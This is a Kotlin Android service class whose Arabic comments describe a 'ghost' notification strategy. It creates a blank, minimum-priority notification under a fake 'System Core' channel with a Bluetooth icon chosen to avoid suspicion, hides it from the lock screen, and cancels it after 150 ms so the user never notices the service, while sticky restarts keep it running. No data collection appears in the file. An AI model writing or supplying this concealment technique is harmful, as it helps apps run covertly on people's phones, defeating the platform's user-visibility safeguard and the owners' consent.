package com.example.app

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.ServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" ديناميكي.
 *
 * استراتيجية التخفي المتقدمة (Dynamic Pulse Ghost):
 * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
 * - يتم إلغاء الإشعار بعد 150 مللي ثانية (شبح) لضمان عدم ملاحظته بشرياً
 * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
 * - أيقونة نظامية عامة (stat_sys_data_bluetooth) لتجنب الشك
 * - إخفاء المحتوى من شاشة القفل
 *
 * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
 * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
 * ✅ تم إصلاح ForegroundServiceDidNotStartInTimeException
 *   باستخدام startForeground مع النوع الصحيح (FOREGROUND_SERVICE_TYPE_DATA_SYNC)
 *   وتقليل وقت الإلغاء إلى 150ms
 */
class ForegroundService : Service() {

    companion object {
        private const val CHANNEL_ID = "ghost_system_channel_v3"
        private const val NOTIF_ID = 7777
        private const val TAG = "ForegroundService"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // بدء الخدمة كـ Foreground إذا لم تكن قيد التشغيل
        try {
            createGhostChannel()

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true) // ✅ ضروري لمنع قتل الخدمة
                .setSilent(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build()

            // ✅ بدء الخدمة قانونياً مع النوع المناسب لتجنب قيود أندرويد 14
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIF_ID, notification)
            }

            MainActivity.appendLogStatic("✅ Ghost notification started")

            // ✅ تقنية الإشعار الشبحي: إلغاء الإشعار خلال 150 ملي ثانية فقط
            // هذا يمنع ForegroundServiceDidNotStartInTimeException
            // ويحقق اختفاء الإشعار خلال أجزاء من الثانية دون ملاحظة المستخدم
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    nm.cancel(NOTIF_ID)
                    MainActivity.appendLogStatic("✅ Ghost notification hidden (Stealth Mode)")
                    android.util.Log.d(TAG, "✅ Ghost notification hidden")
                } catch (_: Exception) {
                    // تجاهل أخطاء الإلغاء
                }
            }, 150) // ✅ 150ms فقط لإرضاء النظام وإخفاء الإشعار فوراً

        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ Failed to start foreground service: ${e.message}")
            MainActivity.appendLogStatic("❌ Foreground service start error: ${e.message}")
        }

        return START_STICKY
    }

    /**
     * إنشاء قناة الإشعارات بأدنى أولوية ممكنة (IMPORTANCE_MIN)
     * لمنع ظهور الإشعار في شريط الحالة أو إحداث أي إزعاج للمستخدم.
     */
    private fun createGhostChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Core",
                NotificationManager.IMPORTANCE_MIN // أدنى أولوية مرئية
            ).apply {
                description = "Background system operations"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                setBypassDnd(false)
                enableLights(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
            android.util.Log.d(TAG, "✅ Ghost notification channel created")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        android.util.Log.d(TAG, "ForegroundService destroyed")
        MainActivity.appendLogStatic("🛑 ForegroundService destroyed")
    }
}
